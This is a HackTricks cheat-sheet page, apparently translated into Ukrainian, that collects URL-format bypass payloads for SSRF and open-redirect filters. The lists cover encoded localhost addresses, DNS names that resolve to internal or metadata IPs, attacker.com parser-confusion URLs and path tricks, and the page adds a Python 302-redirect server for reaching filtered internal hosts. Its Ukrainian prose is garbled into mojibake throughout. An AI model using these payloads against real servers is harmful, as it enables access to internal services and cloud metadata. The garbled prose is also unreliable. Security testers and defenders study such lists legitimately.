# –ü–µ—Ä–µ—Ö—ñ–¥ –∑–∞ —Ñ–æ—Ä–º–∞—Ç–æ–º URL

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

**–ì—Ä—É–ø–∞ –∑ –±–µ–∑–ø–µ–∫–∏ Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

### –õ–æ–∫–∞–ª—å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://‚ë†‚ë°‚ë¶.‚ì™.‚ì™.‚ì™

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127„ÄÇ0„ÄÇ0„ÄÇ1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
![](<../../.gitbook/assets/image (649) (1) (1).png>)

**–†–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) —Ä–µ–∞–ª—ñ–∑—É—î –æ–±—Ö—ñ–¥ —Ñ–æ—Ä–º–∞—Ç—É–≤–∞–Ω–Ω—è IP.

### –ü–∞—Ä—Å–µ—Ä –¥–æ–º–µ–Ω—É
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker„ÄÇcom
‚í∂‚ìâ‚ìâ‚í∂‚í∏‚ìÄ‚í∫‚ì°.‚í∏‚ìû‚ìú
```

```
‚ë† ‚ë° ‚ë¢ ‚ë£ ‚ë§ ‚ë• ‚ë¶ ‚ëß ‚ë® ‚ë© ‚ë™ ‚ë´ ‚ë¨ ‚ë≠ ‚ëÆ ‚ëØ ‚ë∞ ‚ë± ‚ë≤ ‚ë≥ ‚ë¥ ‚ëµ ‚ë∂ ‚ë∑ ‚ë∏ ‚ëπ ‚ë∫ ‚ëª ‚ëº ‚ëΩ ‚ëæ
‚ëø ‚íÄ ‚íÅ ‚íÇ ‚íÉ ‚íÑ ‚íÖ ‚íÜ ‚íá ‚íà ‚íâ ‚íä ‚íã ‚íå ‚íç ‚íé ‚íè ‚íê ‚íë ‚íí ‚íì ‚íî ‚íï ‚íñ ‚íó
‚íò ‚íô ‚íö ‚íõ ‚íú ‚íù ‚íû ‚íü ‚í† ‚í° ‚í¢ ‚í£ ‚í§ ‚í• ‚í¶ ‚íß ‚í® ‚í© ‚í™ ‚í´ ‚í¨ ‚í≠ ‚íÆ ‚íØ ‚í∞
‚í± ‚í≤ ‚í≥ ‚í¥ ‚íµ ‚í∂ ‚í∑ ‚í∏ ‚íπ ‚í∫ ‚íª ‚íº ‚íΩ ‚íæ ‚íø ‚ìÄ ‚ìÅ ‚ìÇ ‚ìÉ ‚ìÑ ‚ìÖ ‚ìÜ ‚ìá ‚ìà ‚ìâ
‚ìä ‚ìã ‚ìå ‚ìç ‚ìé ‚ìè ‚ìê ‚ìë ‚ìí ‚ìì ‚ìî ‚ìï ‚ìñ ‚ìó ‚ìò ‚ìô ‚ìö ‚ìõ ‚ìú ‚ìù ‚ìû ‚ìü ‚ì† ‚ì° ‚ì¢
‚ì£ ‚ì§ ‚ì• ‚ì¶ ‚ìß ‚ì® ‚ì© ‚ì™ ‚ì´ ‚ì¨ ‚ì≠ ‚ìÆ ‚ìØ ‚ì∞ ‚ì± ‚ì≤ ‚ì≥ ‚ì¥ ‚ìµ ‚ì∂ ‚ì∑ ‚ì∏ ‚ìπ ‚ì∫ ‚ìª ‚ìº ‚ìΩ ‚ìæ ‚ìø
```
### –î–æ–º–µ–Ω–Ω–µ –∑–±–µ–Ω—Ç–µ–∂–µ–Ω–Ω—è
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### –û–±—Ö—ñ–¥ —à–ª—è—Ö—ñ–≤ —Ç–∞ —Ä–æ–∑—à–∏—Ä–µ–Ω—å

–Ø–∫—â–æ –≤–∏–º–∞–≥–∞—î—Ç—å—Å—è, —â–æ–± URL –∑–∞–∫—ñ–Ω—á—É–≤–∞–≤—Å—è —à–ª—è—Ö–æ–º –∞–±–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º, –∞–±–æ –º—ñ—Å—Ç–∏–≤ —à–ª—è—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ–¥–∏–Ω –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –æ–±—Ö—ñ–¥—ñ–≤:
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**recollapse**](https://github.com/0xacb/recollapse) –º–æ–∂–µ –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –≤–∞—Ä—ñ–∞—Ü—ñ—ó –∑ –≤–∫–∞–∑–∞–Ω–æ–≥–æ –≤–≤–æ–¥—É, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ–±—ñ–π—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π —Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**—Ü–µ–π –ø–æ—Å—Ç**](https://0xacb.com/2022/11/21/recollapse/) —Ç–∞–∫–æ–∂ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

### –û–±—Ö—ñ–¥ —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è

–ú–æ–∂–ª–∏–≤–æ, —Å–µ—Ä–≤–µ—Ä **—Ñ—ñ–ª—å—Ç—Ä—É—î –ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç** SSRF, **–∞–ª–µ –Ω–µ** –º–æ–∂–ª–∏–≤—É **–≤—ñ–¥–ø–æ–≤—ñ–¥—å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è** –Ω–∞ —Ü–µ–π –∑–∞–ø–∏—Ç.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Å–µ—Ä–≤–µ—Ä, —è–∫–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ SSRF —á–µ—Ä–µ–∑: `url=https://www.google.com/`, –º–æ–∂–µ **—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä url**. –ê–ª–µ —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ [python —Å–µ—Ä–≤–µ—Ä –¥–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –∫–æ–¥–æ–º 302](https://pastebin.com/raw/ywAUhFrv) –Ω–∞ –º—ñ—Å—Ü–µ, –∫—É–¥–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å** —Ç–∞–∫–∏—Ö —è–∫ 127.0.0.1 –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏—Ö **–ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤** —è–∫ gopher.\
[–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ —Ü–µ–π –∑–≤—ñ—Ç.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## –ü–æ—è—Å–Ω–µ–Ω—ñ —Ç—Ä—é–∫–∏

### –¢—Ä—é–∫ –∑ —á–æ—Ä—Ç–æ—é

_–¢—Ä—é–∫ –∑ —á–æ—Ä—Ç–æ—é_ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ä—ñ–∑–Ω–∏—Ü—é –º—ñ–∂ [—Å—Ç–∞–Ω–¥–∞—Ä—Ç–æ–º URL WHATWG](https://url.spec.whatwg.org/#url-parsing) —Ç–∞ [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). –£ —Ç–æ–π —á–∞—Å —è–∫ RFC3986 —î –∑–∞–≥–∞–ª—å–Ω–æ—é —Å—Ç—Ä—É–∫—Ç—É—Ä–æ—é –¥–ª—è URI, WHATWG —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–π –¥–ª—è –≤–µ–±-URL —Ç–∞ –ø—Ä–∏–π–Ω—è—Ç–∏–π —Å—É—á–∞—Å–Ω–∏–º–∏ –±—Ä–∞—É–∑–µ—Ä–∞–º–∏. –û—Å–Ω–æ–≤–Ω–∞ –≤—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç WHATWG –≤–∏–∑–Ω–∞—î –∑–≤–æ—Ä–æ—Ç–Ω—é –∫–æ—Å—É —Ä–∏—Å–∫—É (`\`) –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ—é –ø—Ä—è–º—ñ–π –∫–æ—Å—ñ–π —Ä–∏—Å—Ü—ñ (`/`), —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ç–µ, —è–∫ URL —Ä–æ–∑–±–∏—Ä–∞—é—Ç—å—Å—è, –∑–æ–∫—Ä–µ–º–∞ –ø–æ–∑–Ω–∞—á–∞—é—á–∏ –ø–µ—Ä–µ—Ö—ñ–¥ –≤—ñ–¥ —ñ–º–µ–Ω—ñ —Ö–æ—Å—Ç–∞ –¥–æ —à–ª—è—Ö—É –≤ URL.

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### –Ü–Ω—à—ñ –ø–ª—É—Ç–∞–Ω–∏–Ω–∏

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../.gitbook/assets/image (629).png>)

–∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑ [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)

**–ì—Ä—É–ø–∞ Try Hard Security**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
